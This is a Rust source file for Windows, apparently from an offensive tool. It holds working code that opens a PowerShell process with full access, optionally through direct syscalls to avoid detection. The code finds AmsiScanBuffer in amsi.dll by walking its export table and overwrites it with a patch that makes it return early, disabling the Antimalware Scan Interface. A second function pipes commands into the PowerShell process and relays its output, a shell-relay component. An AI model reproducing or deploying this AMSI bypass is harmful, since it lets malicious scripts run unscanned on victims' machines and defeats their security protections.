#![cfg(target_family = "windows")]

use crate::utils::structures::{IMAGE_nt_headS64, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
use crate::utils::tools::*;

use core::time;
use regex::Regex;
use std::error::Error;
use std::ffi::c_void;
use std::io::{BufReader, Read, Write};
use std::mem::MaybeUninit;
use std::process::Child;
use std::sync::mpsc::{Receiver, Sender, TryRecvError};
use std::thread;

use ntapi::ntapi_base::CLIENT_ID;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, PVOID};
use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPALL,
};
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

use syscalls::syscall;

static PATH_REGEX: &str = r#"PS (?<ParentPath>(?:[a-zA-Z]\:|\\\\[\w\s\.\-]+\\[^\/\\<>:"|?\n\r]+)\\(?:[^\/\\<>:"|?\n\r]+\\)*)(?<BaseName>[^\/\\<>:"|?\n\r]*?)> "#;

fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isize {
    let mut status: NTSTATUS;
    let mut buf: [u8; 64] = [0; 64];

    unsafe {
        // Retrieves the DOS headers of amsi.dll
        if syscalls_value {
            status = syscall!(
                "NtReadVirtualMemory",
                phandle as *mut c_void,
                amsiaddr as *mut c_void,
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
                NULL
            );

            if !NT_SUCCESS(status) {
                log::debug!(
                    "Error reading target memory to retrieve the DOS headers: {:x}",
                    status
                );
            }
        } else {
            ReadProcessMemory(
                phandle,
                amsiaddr as *const c_void,
                buf.as_mut_ptr() as *mut c_void,
                64,
                std::ptr::null_mut(),
            );
        }
        let mut dos_head = IMAGE_DOS_HEADER::default();
        fill_structure_from_array(&mut dos_head, &buf, syscalls_value);

        // Retrieves the NT headers of amsi.dll
        let mut nt_head = IMAGE_nt_headS64::default();
        fill_structure_from_memory(
            &mut nt_head,
            (amsiaddr + dos_head.e_lfanew as isize) as *const c_void,
            phandle as isize,
            syscalls_value,
        );
        log::debug!(
            "NT headers: {:#x?}",
            nt_head.OptionalHeader.ExportTable.VirtualAddress
        );

        // Parse all the DLL's exports and find the AmsiScanBuffer function
        let mut exports = IMAGE_EXPORT_DIRECTORY::default();
        fill_structure_from_memory(
            &mut exports,
            (amsiaddr + nt_head.OptionalHeader.ExportTable.VirtualAddress as isize)
                as *const c_void,
            phandle as isize,
            syscalls_value,
        );
        log::debug!("Exports: {:#x?}", exports);

        let mut i = 0;
        loop {
            let mut nameaddr: [u8; 4] = [0; 4];
            if syscalls_value {
                status = syscall!(
                    "NtReadVirtualMemory",
                    phandle as *mut c_void,
                    (amsiaddr + exports.AddressOfNames as isize + (i * 4)) as *mut c_void,
                    nameaddr.as_mut_ptr() as *mut c_void,
                    nameaddr.len(),
                    NULL
                );

                if !NT_SUCCESS(status) {
                    log::debug!(
                        "Error reading target memory to retrieve the function: {:x}",
                        status
                    );
                }
            } else {
                ReadProcessMemory(
                    phandle,
                    (amsiaddr + exports.AddressOfNames as isize + (i * 4)) as *const c_void,
                    nameaddr.as_mut_ptr() as *mut c_void,
                    nameaddr.len(),
                    std::ptr::null_mut(),
                );
            }
            let num = u32::from_ne_bytes(nameaddr.try_into().unwrap());
            let funcname = read_from_memory(
                (amsiaddr + num as isize) as *const c_void,
                phandle as isize,
                syscalls_value,
            );
            if funcname.trim_end_matches('\0') == "AmsiScanBuffer" {
                log::debug!("Name: {}", funcname);

                let mut ord: [u8; 2] = [0; 2];
                if syscalls_value {
                    status = syscall!(
                        "NtReadVirtualMemory",
                        phandle as *mut c_void,
                        (amsiaddr + exports.AddressOfNameOrdinals as isize + (i * 2))
                            as *mut c_void,
                        ord.as_mut_ptr() as *mut c_void,
                        ord.len(),
                        NULL
                    );

                    if !NT_SUCCESS(status) {
                        log::debug!(
                            "Error reading target memory to retrieve the index number: {:x}",
                            status
                        );
                    }
                } else {
                    ReadProcessMemory(
                        phandle,
                        (amsiaddr + exports.AddressOfNameOrdinals as isize + (i * 2))
                            as *const c_void,
                        ord.as_mut_ptr() as *mut c_void,
                        ord.len(),
                        std::ptr::null_mut(),
                    );
                }
                let index = u16::from_ne_bytes(ord.try_into().unwrap());
                log::debug!("Index: {}", index);

                let mut addr: [u8; 4] = [0; 4];
                if syscalls_value {
                    status = syscall!(
                        "NtReadVirtualMemory",
                        phandle as *mut c_void,
                        (amsiaddr + exports.AddressOfFunctions as isize + (index as isize * 4))
                            as *mut c_void,
                        addr.as_mut_ptr() as *mut c_void,
                        addr.len(),
                        NULL
                    );

                    if !NT_SUCCESS(status) {
                        log::debug!(
                            "Error reading target memory to retrieve the index address: {:x}",
                            status
                        );
                    }
                } else {
                    ReadProcessMemory(
                        phandle,
                        (amsiaddr + exports.AddressOfFunctions as isize + (index as isize * 4))
                            as *const c_void,
                        addr.as_mut_ptr() as *mut c_void,
                        addr.len(),
                        std::ptr::null_mut(),
                    );
                }
                let addrindex = u32::from_ne_bytes(addr.try_into().unwrap());
                log::debug!("Index addr: {}", addrindex);
                return amsiaddr + addrindex as isize;
            }

            i += 1;
            if i >= exports.NumberOfNames as isize {
                break;
            }
        }
        return 0;
    }
}

pub fn patch_amsi(pid: u32, syscalls_value: bool) {
    unsafe {
        // Start PowerShell process
        //let mut lpStartupInfo: STARTUPINFOA = std::mem::zeroed();
        //let mut lpProcessInformation: windows_sys::Win32::System::Threading::PROCESS_INFORMATION = std::mem::zeroed();
        /*CreateProcessA(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0".as_ptr() as *const u8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut lpStartupInfo as *mut STARTUPINFOA,
            &mut lpProcessInformation
                as *mut windows_sys::Win32::System::Threading::PROCESS_INFORMATION,
        );*/
        let mut new_handle = pid as HANDLE;
        let mut status: NTSTATUS;
        if syscalls_value {
            let object_attr = OBJECT_ATTRIBUTES::default();
            let client_id: CLIENT_ID = CLIENT_ID {
                UniqueProcess: pid as _,
                UniqueThread: 0 as _,
            };
            status = syscall!(
                "NtOpenProcess",
                &mut new_handle,
                PROCESS_ALL_ACCESS,
                &object_attr,
                &client_id
            );
            if !NT_SUCCESS(status) {
                log::debug!("Error openning target process: {:x}", status);
            }
        } else {
            new_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid) as *mut c_void;
        }
        //Wait for the process to totally load before the snap
        std::thread::sleep(time::Duration::from_secs(2));
        let snap_handle = CreateToolhelp32Snapshot(TH32CS_SNAPALL, pid);

        // Initialization
        let mut first_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
        first_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
        Module32First(snap_handle, &mut first_mod as *mut MODULEENTRY32);
        let _modulname = string_from_array(&mut first_mod.szModule.to_vec());
        log::debug!("Module name: {:?}", _modulname);

        // Search for the amsi.dll module in the PowerShell process memory
        let mut amsiaddr: isize = 0;
        loop {
            let mut next_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
            next_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
            let res_next = Module32Next(snap_handle, &mut next_mod as *mut MODULEENTRY32);
            let next_module = string_from_array(&mut next_mod.szModule.to_vec());
            log::debug!("Next module: {:?}", next_module);

            if next_module == "amsi.dll" {
                amsiaddr = next_mod.modBaseAddr as isize;
                break;
            }
            if res_next != 1 {
                break;
            }
        }

        log::debug!("Amsi base addr: {:x?}", amsiaddr);
        let mut scanbuffer_addr =
            get_scan_buffer(amsiaddr, new_handle as isize, syscalls_value) as *mut c_void;
        log::debug!("AmsiScanBuffer base addr: {:x?}", scanbuffer_addr);

        // mov rax, 1
        // ret
        let mut patch: [u8; 8] = [0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3];
        if syscalls_value {
            let mut save_addr: PVOID = scanbuffer_addr;
            let mut old_perms = PAGE_EXECUTE_READ;
            status = syscall!(
                "NtProtectVirtualMemory",
                new_handle,
                &mut scanbuffer_addr,
                &mut patch.len(),
                PAGE_READWRITE,
                &mut old_perms
            );
            if !NT_SUCCESS(status) {
                log::debug!("Error changing memory permissions: {:x}", status);
            }
            status = syscall!(
                "NtWriteVirtualMemory",
                new_handle,
                save_addr,
                patch.as_mut_ptr() as *mut c_void,
                patch.len(),
                NULL
            );
            if !NT_SUCCESS(status) {
                log::debug!("Error patching target process: {:x}", status);
            }
            status = syscall!(
                "NtProtectVirtualMemory",
                new_handle,
                &mut save_addr,
                &mut patch.len(),
                old_perms,
                &mut old_perms
            );
            if !NT_SUCCESS(status) {
                log::debug!("Error rollback memory permissions: {:x}", status);
            }
        } else {
            WriteProcessMemory(
                new_handle as isize,
                scanbuffer_addr,
                patch.as_ptr() as *const c_void,
                patch.len(),
                std::ptr::null_mut(),
            );
        }

        CloseHandle(new_handle as isize);
    }
}

pub fn start_process_thread(
    child: &mut Child,
    sender: Sender<String>,
    receiver: Receiver<String>,
) -> Result<(), Box<dyn Error>> {
    let mut stdin = child.stdin.take().unwrap();
    let stdout = child.stdout.take().unwrap();
    let path_regex = Regex::new(PATH_REGEX).unwrap();
    thread::spawn(move || {
        let mut f = BufReader::new(stdout);
        let mut buff_to_send: [u8; 4096];
        loop {
            buff_to_send = [0; 4096];
            match f.read(&mut buff_to_send) {
                Ok(_) => {
                    /*
                    Here we stop reading PowerShell output with a regex that matches the PS line waiting for user input "PS <path> >"
                    - Is it crappy ? Yes
                    - Is there a better solution ? Yeah, probably
                    - Have I tried other solutions ? Yes, like searching for an EOF like or identifying the PowerShell thread waiting for UserRequest, but none has been successfull
                    - What can you do to make the world a better place ? Make a PR :)
                    */
                    while !path_regex.is_match(
                        String::from_utf8_lossy(&buff_to_send)
                            .trim_end_matches("\0")
                            .to_string()
                            .as_str(),
                    ) {
                        sender
                            .send(String::from_utf8_lossy(&buff_to_send).to_string())
                            .expect("Thread send error");
                        buff_to_send = [0; 4096];
                        match f.read(&mut buff_to_send) {
                            Ok(_) => (),
                            Err(r) => {
                                sender
                                    .send(
                                        "Error reading output from stdout: ".to_string()
                                            + &r.to_string(),
                                    )
                                    .unwrap();
                                sender.send("EndOfOutput".to_string()).unwrap();
                                break;
                            }
                        }
                    }
                    sender
                        .send(String::from_utf8_lossy(&buff_to_send).to_string())
                        .unwrap();
                    sender.send("EndOfOutput".to_string()).unwrap();
                }
                Err(r) => {
                    log::debug!("{:?}", r);
                    sender
                        .send("Error reading output from stdout: ".to_string() + &r.to_string())
                        .unwrap();
                    sender.send("EndOfOutput".to_string()).unwrap();
                    continue;
                }
            }
            loop {
                match receiver.try_recv() {
                    Ok(command) => match stdin.write_all(command.as_bytes()) {
                        Ok(_) => break,
                        Err(r) => {
                            log::debug!("Error sending command to stdin: {:?}", r);
                            sender
                                .send(
                                    "Error sending command to stdin: ".to_string() + &r.to_string(),
                                )
                                .unwrap();
                            sender.send("EndOfOutput".to_string()).unwrap();
                            continue;
                        }
                    },
                    Err(TryRecvError::Empty) => {
                        continue;
                    }
                    Err(r) => {
                        log::debug!("Thread recv error: {:?}", r);
                        sender
                            .send("Error reading command: ".to_string() + &r.to_string())
                            .unwrap();
                        sender.send("EndOfOutput".to_string()).unwrap();
                        continue;
                    }
                }
            }
        }
    });

    Ok(())
}
